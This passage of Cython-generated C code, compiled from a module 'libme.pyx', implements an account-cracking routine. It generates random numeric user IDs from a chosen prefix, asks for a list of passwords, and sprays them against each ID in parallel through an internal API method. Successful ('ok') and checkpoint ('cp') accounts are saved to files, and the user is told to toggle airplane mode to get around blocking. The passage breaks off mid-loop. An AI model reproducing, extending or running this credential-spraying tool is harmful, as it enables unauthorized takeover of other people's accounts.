  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_8);
  __Pyx_XDECREF(__pyx_t_9);
  __Pyx_XDECREF(__pyx_t_10);
  __Pyx_XDECREF(__pyx_t_11);
  __Pyx_XDECREF(__pyx_t_13);
  __Pyx_AddTraceback("libme.James.__fb2__", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_idx);
  __Pyx_XDECREF(__pyx_v_limit);
  __Pyx_XDECREF(__pyx_v_i);
  __Pyx_XDECREF(__pyx_v_ib);
  __Pyx_XDECREF(__pyx_v_coeg);
  __Pyx_XDECREF(__pyx_v_listpass);
  __Pyx_XDECREF(__pyx_v_user);
  __Pyx_XDECREF(__pyx_v_e);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "libme.pyx":259
 * 		except Exception as e:
 * 			exit(str(e))
 * 	def __fb3__(self):             # <<<<<<<<<<<<<<
 * 		x = 1111111
 * 		xx = 9999999
 */

/* Python wrapper */
static PyObject *__pyx_pw_5libme_5James_15__fb3__(PyObject *__pyx_self, PyObject *__pyx_v_self); /*proto*/
static PyMethodDef __pyx_mdef_5libme_5James_15__fb3__ = {"__fb3__", (PyCFunction)__pyx_pw_5libme_5James_15__fb3__, METH_O, 0};
static PyObject *__pyx_pw_5libme_5James_15__fb3__(PyObject *__pyx_self, PyObject *__pyx_v_self) {
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("__fb3__ (wrapper)", 0);
  __pyx_r = __pyx_pf_5libme_5James_14__fb3__(__pyx_self, ((PyObject *)__pyx_v_self));

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5libme_5James_14__fb3__(CYTHON_UNUSED PyObject *__pyx_self, PyObject *__pyx_v_self) {
  long __pyx_v_x;
  long __pyx_v_xx;
  PyObject *__pyx_v_idx = NULL;
  PyObject *__pyx_v_limit = NULL;
  PyObject *__pyx_v_i = NULL;
  PyObject *__pyx_v_ib = NULL;
  PyObject *__pyx_v_coeg = NULL;
  PyObject *__pyx_v_listpass = NULL;
  PyObject *__pyx_v_user = NULL;
  PyObject *__pyx_v_e = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  Py_ssize_t __pyx_t_6;
  PyObject *(*__pyx_t_7)(PyObject *);
  PyObject *__pyx_t_8 = NULL;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  int __pyx_t_12;
  PyObject *__pyx_t_13 = NULL;
  int __pyx_t_14;
  PyObject *__pyx_t_15 = NULL;
  PyObject *__pyx_t_16 = NULL;
  PyObject *__pyx_t_17 = NULL;
  PyObject *__pyx_t_18 = NULL;
  int __pyx_t_19;
  PyObject *__pyx_t_20 = NULL;
  int __pyx_t_21;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("__fb3__", 0);

  /* "libme.pyx":260
 * 			exit(str(e))
 * 	def __fb3__(self):
 * 		x = 1111111             # <<<<<<<<<<<<<<
 * 		xx = 9999999
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")
 */
  __pyx_v_x = 0x10F447;

  /* "libme.pyx":261
 * 	def __fb3__(self):
 * 		x = 1111111
 * 		xx = 9999999             # <<<<<<<<<<<<<<
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 */
  __pyx_v_xx = 0x98967F;

  /* "libme.pyx":262
 * 		x = 1111111
 * 		xx = 9999999
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")             # <<<<<<<<<<<<<<
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__22, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 262, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_idx = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "libme.pyx":263
 * 		xx = 9999999
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))             # <<<<<<<<<<<<<<
 * 		try:
 * 			for i in range(limit):
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__20, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 263, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_2 = __Pyx_PyNumber_Int(__pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 263, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  __pyx_v_limit = __pyx_t_2;
  __pyx_t_2 = 0;

  /* "libme.pyx":264
 * 		idx = input("    2010 > 10000170,10000180,10000190\n    2008 > 10000000\n  [+] Choose Code : ")
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:             # <<<<<<<<<<<<<<
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 */
  {
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ExceptionSave(&__pyx_t_3, &__pyx_t_4, &__pyx_t_5);
    __Pyx_XGOTREF(__pyx_t_3);
    __Pyx_XGOTREF(__pyx_t_4);
    __Pyx_XGOTREF(__pyx_t_5);
    /*try:*/ {

      /* "libme.pyx":265
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      __pyx_t_2 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 265, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_2);
      if (likely(PyList_CheckExact(__pyx_t_2)) || PyTuple_CheckExact(__pyx_t_2)) {
        __pyx_t_1 = __pyx_t_2; __Pyx_INCREF(__pyx_t_1); __pyx_t_6 = 0;
        __pyx_t_7 = NULL;
      } else {
        __pyx_t_6 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 265, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        __pyx_t_7 = Py_TYPE(__pyx_t_1)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 265, __pyx_L3_error)
      }
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
      for (;;) {
        if (likely(!__pyx_t_7)) {
          if (likely(PyList_CheckExact(__pyx_t_1))) {
            if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 265, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 265, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          } else {
            if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_2 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_6); __Pyx_INCREF(__pyx_t_2); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 265, __pyx_L3_error)
            #else
            __pyx_t_2 = PySequence_ITEM(__pyx_t_1, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 265, __pyx_L3_error)
            __Pyx_GOTREF(__pyx_t_2);
            #endif
          }
        } else {
          __pyx_t_2 = __pyx_t_7(__pyx_t_1);
          if (unlikely(!__pyx_t_2)) {
            PyObject* exc_type = PyErr_Occurred();
            if (exc_type) {
              if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
              else __PYX_ERR(0, 265, __pyx_L3_error)
            }
            break;
          }
          __Pyx_GOTREF(__pyx_t_2);
        }
        __Pyx_XDECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":266
 * 		try:
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)             # <<<<<<<<<<<<<<
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_8, __pyx_n_s_random); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 266, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_8, __pyx_n_s_randint); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 266, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        __pyx_t_8 = __Pyx_PyInt_From_long(__pyx_v_x); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 266, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_8);
        __pyx_t_10 = __Pyx_PyInt_From_long(__pyx_v_xx); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 266, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_10);
        __pyx_t_11 = NULL;
        __pyx_t_12 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_11)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_11);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_12 = 1;
          }
        }
        #if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 266, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        #if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_9)) {
          PyObject *__pyx_temp[3] = {__pyx_t_11, __pyx_t_8, __pyx_t_10};
          __pyx_t_2 = __Pyx_PyCFunction_FastCall(__pyx_t_9, __pyx_temp+1-__pyx_t_12, 2+__pyx_t_12); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 266, __pyx_L3_error)
          __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
          __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        } else
        #endif
        {
          __pyx_t_13 = PyTuple_New(2+__pyx_t_12); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 266, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_13);
          if (__pyx_t_11) {
            __Pyx_GIVEREF(__pyx_t_11); PyTuple_SET_ITEM(__pyx_t_13, 0, __pyx_t_11); __pyx_t_11 = NULL;
          }
          __Pyx_GIVEREF(__pyx_t_8);
          PyTuple_SET_ITEM(__pyx_t_13, 0+__pyx_t_12, __pyx_t_8);
          __Pyx_GIVEREF(__pyx_t_10);
          PyTuple_SET_ITEM(__pyx_t_13, 1+__pyx_t_12, __pyx_t_10);
          __pyx_t_8 = 0;
          __pyx_t_10 = 0;
          __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_13, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 266, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_2);
          __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        }
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF_SET(__pyx_v_i, __pyx_t_2);
        __pyx_t_2 = 0;

        /* "libme.pyx":267
 * 			for i in range(limit):
 * 				i = random.randint(x,xx)
 * 				ib = idx             # <<<<<<<<<<<<<<
 * 				self.id.append(ib+str(i))
 * 			print("  \033[0;91m[] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 */
        __Pyx_INCREF(__pyx_v_idx);
        __Pyx_XDECREF_SET(__pyx_v_ib, __pyx_v_idx);

        /* "libme.pyx":268
 * 				i = random.randint(x,xx)
 * 				ib = idx
 * 				self.id.append(ib+str(i))             # <<<<<<<<<<<<<<
 * 			print("  \033[0;91m[] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 */
        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 268, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __pyx_t_9 = __Pyx_PyObject_CallOneArg(((PyObject *)(&PyString_Type)), __pyx_v_i); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 268, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_13 = PyNumber_Add(__pyx_v_ib, __pyx_t_9); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 268, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_14 = __Pyx_PyObject_Append(__pyx_t_2, __pyx_t_13); if (unlikely(__pyx_t_14 == ((int)-1))) __PYX_ERR(0, 268, __pyx_L3_error)
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

        /* "libme.pyx":265
 * 		limit = int(input("  [!] Enter The Number Of Ids : "))
 * 		try:
 * 			for i in range(limit):             # <<<<<<<<<<<<<<
 * 				i = random.randint(x,xx)
 * 				ib = idx
 */
      }
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

      /* "libme.pyx":269
 * 				ib = idx
 * 				self.id.append(ib+str(i))
 * 			print("  \033[0;91m[] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))             # <<<<<<<<<<<<<<
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 */
      __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 269, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_6 = PyObject_Length(__pyx_t_1); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 269, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 269, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_1);
      __pyx_t_13 = __Pyx_PyString_Format(__pyx_kp_s_0_91m_Total_id_0_91m_s_0_97m, __pyx_t_1); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 269, __pyx_L3_error)
      __Pyx_GOTREF(__pyx_t_13);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
      if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 269, __pyx_L3_error)
      __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

      /* "libme.pyx":270
 * 				self.id.append(ib+str(i))
 * 			print("  \033[0;91m[] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 */
      /*with:*/ {
        __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_n_s_ThreadPoolExecutor); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 270, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_1 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 270, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_1);
        if (PyDict_SetItem(__pyx_t_1, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 270, __pyx_L3_error)
        __pyx_t_2 = __Pyx_PyObject_Call(__pyx_t_13, __pyx_empty_tuple, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 270, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_2);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __pyx_t_15 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 270, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_15);
        __pyx_t_13 = __Pyx_PyObject_LookupSpecial(__pyx_t_2, __pyx_n_s_enter); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 270, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_13);
        __pyx_t_9 = NULL;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_13))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_13);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_13);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_13, function);
          }
        }
        __pyx_t_1 = (__pyx_t_9) ? __Pyx_PyObject_CallOneArg(__pyx_t_13, __pyx_t_9) : __Pyx_PyObject_CallNoArg(__pyx_t_13);
        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 270, __pyx_L11_error)
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
        __pyx_t_13 = __pyx_t_1;
        __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
        /*try:*/ {
          {
            __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_16, &__pyx_t_17, &__pyx_t_18);
            __Pyx_XGOTREF(__pyx_t_16);
            __Pyx_XGOTREF(__pyx_t_17);
            __Pyx_XGOTREF(__pyx_t_18);
            /*try:*/ {
              __pyx_v_coeg = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":271
 * 			print("  \033[0;91m[] Total id > \033[0;91m(%s)\033[0;97m"%(len(self.id)))
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")             # <<<<<<<<<<<<<<
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_For_Example_Separators_12) < 0) __PYX_ERR(0, 271, __pyx_L15_error)

              /* "libme.pyx":272
 * 			with ThreadPoolExecutor(max_workers=30) as coeg:
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")             # <<<<<<<<<<<<<<
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 */
              __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__10, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 272, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              __pyx_v_listpass = __pyx_t_13;
              __pyx_t_13 = 0;

              /* "libme.pyx":273
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              __pyx_t_6 = PyObject_Length(__pyx_v_listpass); if (unlikely(__pyx_t_6 == ((Py_ssize_t)-1))) __PYX_ERR(0, 273, __pyx_L15_error)
              __pyx_t_19 = ((__pyx_t_6 <= 5) != 0);
              if (__pyx_t_19) {

                /* "libme.pyx":274
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")             # <<<<<<<<<<<<<<
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 */
                __pyx_t_13 = __Pyx_PyObject_Call(__pyx_builtin_exit, __pyx_tuple__11, NULL); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 274, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_13);
                __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

                /* "libme.pyx":273
 * 				print("\n  \033[0;97m[*] For Example Separators : 123456,123456789")
 * 				listpass = input("  [+] Enter password : ")
 * 				if len(listpass)<=5:             # <<<<<<<<<<<<<<
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 */
              }

              /* "libme.pyx":275
 * 				if len(listpass)<=5:
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))             # <<<<<<<<<<<<<<
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 */
              __pyx_t_13 = __Pyx_PyString_FormatSafe(__pyx_kp_s_0_97m_Crack_with_password_0_91m, __pyx_v_listpass); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 275, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (__Pyx_PrintOne(0, __pyx_t_13) < 0) __PYX_ERR(0, 275, __pyx_L15_error)
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;

              /* "libme.pyx":276
 * 					exit("\n  [!] Password Minimum 6 Characters")
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")             # <<<<<<<<<<<<<<
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_0_97m_Ok_result_saved_in_ok_txt) < 0) __PYX_ERR(0, 276, __pyx_L15_error)

              /* "libme.pyx":277
 * 				print("  \033[0;97m[] Crack with password > (\033[0;91m%s\033[0;97m)"%(listpass))
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")             # <<<<<<<<<<<<<<
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_Cp_result_saved_in_cp_txt) < 0) __PYX_ERR(0, 277, __pyx_L15_error)

              /* "libme.pyx":278
 * 				print("\n  \033[0;97m[] Ok result saved in > ok.txt")
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")             # <<<<<<<<<<<<<<
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 */
              if (__Pyx_PrintOne(0, __pyx_kp_s_If_No_Result_Turn_On_Airplane_M) < 0) __PYX_ERR(0, 278, __pyx_L15_error)

              /* "libme.pyx":279
 * 				print("  [] Cp result saved in > cp.txt")
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:             # <<<<<<<<<<<<<<
 * 					coeg.submit(self.__apii__, user, listpass.split(","))
 * 			exit("\n\n [] Cracking finished...")
 */
              __pyx_t_13 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_id); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 279, __pyx_L15_error)
              __Pyx_GOTREF(__pyx_t_13);
              if (likely(PyList_CheckExact(__pyx_t_13)) || PyTuple_CheckExact(__pyx_t_13)) {
                __pyx_t_2 = __pyx_t_13; __Pyx_INCREF(__pyx_t_2); __pyx_t_6 = 0;
                __pyx_t_7 = NULL;
              } else {
                __pyx_t_6 = -1; __pyx_t_2 = PyObject_GetIter(__pyx_t_13); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 279, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_2);
                __pyx_t_7 = Py_TYPE(__pyx_t_2)->tp_iternext; if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 279, __pyx_L15_error)
              }
              __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;
              for (;;) {
                if (likely(!__pyx_t_7)) {
                  if (likely(PyList_CheckExact(__pyx_t_2))) {
                    if (__pyx_t_6 >= PyList_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    __pyx_t_13 = PyList_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 279, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 279, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  } else {
                    if (__pyx_t_6 >= PyTuple_GET_SIZE(__pyx_t_2)) break;
                    #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                    __pyx_t_13 = PyTuple_GET_ITEM(__pyx_t_2, __pyx_t_6); __Pyx_INCREF(__pyx_t_13); __pyx_t_6++; if (unlikely(0 < 0)) __PYX_ERR(0, 279, __pyx_L15_error)
                    #else
                    __pyx_t_13 = PySequence_ITEM(__pyx_t_2, __pyx_t_6); __pyx_t_6++; if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 279, __pyx_L15_error)
                    __Pyx_GOTREF(__pyx_t_13);
                    #endif
                  }
                } else {
                  __pyx_t_13 = __pyx_t_7(__pyx_t_2);
                  if (unlikely(!__pyx_t_13)) {
                    PyObject* exc_type = PyErr_Occurred();
                    if (exc_type) {
                      if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
                      else __PYX_ERR(0, 279, __pyx_L15_error)
                    }
                    break;
                  }
                  __Pyx_GOTREF(__pyx_t_13);
                }
                __Pyx_XDECREF_SET(__pyx_v_user, __pyx_t_13);
                __pyx_t_13 = 0;

                /* "libme.pyx":280
 * 				print("  [!] If No Result Turn On Airplane Mode 5 Seconds\n")
 * 				for user in self.id:
 * 					coeg.submit(self.__apii__, user, listpass.split(","))             # <<<<<<<<<<<<<<
 * 			exit("\n\n [] Cracking finished...")
 * 		except Exception as e:
 */
                __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_coeg, __pyx_n_s_submit); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 280, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_1);
                __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_self, __pyx_n_s_apii); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 280, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_9);
                __pyx_t_8 = __Pyx_PyObject_GetAttrStr(__pyx_v_listpass, __pyx_n_s_split); if (unlikely(!__pyx_t_8)) __PYX_ERR(0, 280, __pyx_L15_error)
                __Pyx_GOTREF(__pyx_t_8);
                __pyx_t_11 = NULL;
                if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_8))) {
                  __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_8);
                  if (likely(__pyx_t_11)) {
